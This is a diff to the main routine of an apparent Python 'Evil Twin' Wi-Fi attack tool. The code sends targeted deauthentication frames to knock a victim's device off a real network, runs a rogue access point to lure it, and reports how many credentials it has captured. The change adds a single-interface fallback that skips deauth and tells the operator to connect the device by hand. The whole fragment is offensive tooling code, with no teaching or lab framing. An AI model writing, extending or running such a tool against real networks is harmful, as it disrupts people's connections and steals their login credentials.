@@ -317,16 +317,26 @@ def main():
     # ── Stage 7: Deauthentication ─────────────────────────────────────────────
     stage_header(7, "Targeted Deauthentication")
 
-    print(f"  [*] Sending Deauth frames to {victim.mac}")
-    print(f"  [*] Victim should disconnect from '{target.ssid}' and")
-    print(f"      reconnect to our Evil Twin...\n")
+    if iface_mon == iface_ap:
+        # Single-interface mode: deauth requires monitor mode which would kill
+        # the AP running on the same interface.  Skip deauth and instruct the
+        # user to disconnect their device manually.
+        print(yellow("  [!] Single-interface mode detected."))
+        print(yellow("      Deauth is disabled to keep the Evil Twin AP stable."))
+        print(yellow(f"      → Manually disconnect your device from '{target.ssid}'"))
+        print(yellow(f"        and connect to the Evil Twin network.\n"))
+        _deauth = None
+    else:
+        print(f"  [*] Sending Deauth frames to {victim.mac}")
+        print(f"  [*] Victim should disconnect from '{target.ssid}' and")
+        print(f"      reconnect to our Evil Twin...\n")
 
-    _deauth = DeauthAttack(
-        iface=iface_mon,
-        client_mac=victim.mac,
-        ap_bssid=target.bssid
-    )
-    _deauth.start()
+        _deauth = DeauthAttack(
+            iface=iface_mon,
+            client_mac=victim.mac,
+            ap_bssid=target.bssid
+        )
+        _deauth.start()
 
     # ── Monitor & Wait ────────────────────────────────────────────────────────
     print(f"\n{bold('─'*60)}")
@@ -346,9 +356,10 @@ def main():
 
         # Status line
         ap_ok = _rogue_ap.is_running()
-        de_ok = _deauth.is_running()
+        de_ok = _deauth.is_running() if _deauth else None
+        de_str = ('RUNNING' if de_ok else red('STOPPED')) if de_ok is not None else yellow('N/A (single iface)')
         print(f"  Status → AP: {'UP' if ap_ok else red('DOWN')}  "
-              f"| Deauth: {'RUNNING' if de_ok else red('STOPPED')}  "
+              f"| Deauth: {de_str}  "
               f"| Creds captured: {len(creds)}")
 
 
